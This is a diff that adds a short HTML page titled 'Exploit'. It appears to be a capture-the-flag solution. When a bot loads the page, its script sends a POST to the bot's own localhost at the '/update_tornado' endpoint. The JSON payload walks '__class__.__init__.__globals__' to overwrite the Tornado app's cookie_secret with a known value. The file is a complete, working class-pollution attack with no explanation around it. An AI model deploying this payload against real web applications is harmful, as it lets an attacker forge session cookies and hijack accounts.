@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <script>
+        const payload = {
+            "machine_id": "<MACHINE_ID>",
+            "__class__": {
+                "__init__": {
+                    "__globals__": {
+                        "APP": {
+                            "settings": {
+                                "cookie_secret": "haha"
+                            }
+                        }
+                    }
+                }
+            }
+        };
+
+        // Bắt bot gửi POST request đến localhost của chính nó
+        fetch("http://127.0.0.1/update_tornado", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
+    </script>
+</body>
+</html>
